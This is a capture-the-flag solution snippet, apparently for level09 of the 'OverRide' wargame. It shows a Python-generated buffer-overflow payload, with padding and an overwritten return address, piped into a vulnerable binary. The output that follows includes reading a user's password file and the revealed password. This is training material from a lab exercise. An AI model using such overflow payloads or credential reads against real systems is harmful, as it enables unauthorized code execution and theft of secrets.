- ### Solution : 
    ```sh
    (python -c 'print("a"*40+"\xff\n"+"x"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00")'; cat) | ./level09
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
    >>: >: Msg sent!
    cat /home/users/end/.pass    
    j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

    Segmentation fault (core dumped)
    level09@OverRide:~$
    ```